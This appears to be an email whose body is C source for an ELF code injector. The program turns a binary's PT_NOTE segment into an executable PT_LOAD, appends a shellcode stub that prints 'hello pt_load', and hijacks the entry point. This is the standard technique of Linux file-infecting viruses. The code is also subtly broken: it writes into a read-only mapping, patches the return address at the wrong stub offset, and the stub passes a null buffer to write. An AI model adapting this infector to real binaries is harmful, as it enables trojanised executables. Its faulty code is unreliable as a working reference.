Octave Rossi <octave.rossi@gmail.com>
	
ven. 17 oct. 13:59 (il y a 19 heures)
	
À moi
/*
 * ELF Injection: PT_NOTE to PT_LOAD conversion and code injection
 * Injected code prints "hello pt_load" before continuing normal execution.
 *
 * Steps implemented: 1-10 (see comments)
 * Output: "injected_elf" (does NOT overwrite original file)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <elf.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

// Replace with actual code bytes for the injected stub
unsigned char injected_stub[] = {
    /* Will be filled after ASM stub assembly */
    0x48,0x31,0xc0,0x48,0x89,0xc2,0x48,0x89,0xc6,0x48,0x8d,0x3d,0x17,0x00,0x00,0x00,
    0xba,0x0c,0x00,0x00,0x00,0xb8,0x01,0x00,0x00,0x00,0xbf,0x01,0x00,0x00,0x00,
    0x0f,0x05,
    // movabs rax, <original_entry>; jmp rax
    0x48,0xb8,0,0,0,0,0,0,0,0,0xff,0xe0,
    // "hello pt_load\n"
    0x68,0x65,0x6c,0x6c,0x6f,0x20,0x70,0x74,0x5f,0x6c,0x6f,0x61,0x64,0x0a,0x00
};
// Offset in stub where to patch the original entry
#define ENTRY_PATCH_OFFSET 33

#define PT_NOTE 4
#define PT_LOAD 1

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <target-elf>\n", argv[0]);
        return 1;
    }

    // 1. Open the ELF file to be injected
    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    struct stat st;
    if (fstat(fd, &st) < 0) { perror("fstat"); close(fd); return 1; }

    size_t filesize = st.st_size;
    unsigned char *elf_data = mmap(NULL, filesize, PROT_READ, MAP_PRIVATE, fd, 0);
    if (elf_data == MAP_FAILED) { perror("mmap"); close(fd); return 1; }

    close(fd);

    // 2. Save the original entry point, e_entry
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)elf_data;
    uint64_t orig_entry = ehdr->e_entry;

    // 3. Parse the program header table, looking for a PT_NOTE segment
    Elf64_Phdr *phdr = (Elf64_Phdr *)(elf_data + ehdr->e_phoff);
    int note_idx = -1;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_NOTE) {
            note_idx = i;
            break;
        }
    }
    if (note_idx == -1) {
        fprintf(stderr, "No PT_NOTE segment found\n");
        munmap(elf_data, filesize);
        return 1;
    }

    // 4. Convert the PT_NOTE segment to a PT_LOAD segment
    phdr[note_idx].p_type = PT_LOAD;

    // 5. Change the memory protections for this segment to allow executable instructions
    phdr[note_idx].p_flags = PF_R | PF_X | PF_W;

    // 6. Change the entry point address to an area that will not conflict with the original program execution.
    //    We inject at the end of the file, mapped at p_vaddr
    uint64_t inject_offset = filesize;
    // Align the injection to a page boundary (for vaddr)
    uint64_t inject_vaddr = (phdr[note_idx].p_vaddr + phdr[note_idx].p_memsz + 0x1000-1) & ~(0x1000-1);

    ehdr->e_entry = inject_vaddr;

    // 7. Adjust the size on disk and virtual memory size to account for the size of the injected code
    size_t inject_size = sizeof(injected_stub);
    phdr[note_idx].p_filesz = inject_size;
    phdr[note_idx].p_memsz = inject_size;

    // 8. Point the offset of our converted segment to the end of the original binary, where we will store the new code
    phdr[note_idx].p_offset = inject_offset;
    phdr[note_idx].p_vaddr = inject_vaddr;
    phdr[note_idx].p_paddr = inject_vaddr;

    // 9. Patch the end of the code with instructions to jump to the original entry point
    //    Patch stub at ENTRY_PATCH_OFFSET with original entry
    memcpy(&injected_stub[ENTRY_PATCH_OFFSET], &orig_entry, sizeof(orig_entry));

    // 10. Add our injected code to the end of the file
    FILE *outf = fopen("injected_elf", "wb");
    if (!outf) { perror("fopen"); munmap(elf_data, filesize); return 1; }
    fwrite(elf_data, 1, filesize, outf);
    fwrite(injected_stub, 1, inject_size, outf);
    fclose(outf);

    munmap(elf_data, filesize);

    printf("Injected ELF written to 'injected_elf'.\n");
    return 0;
}

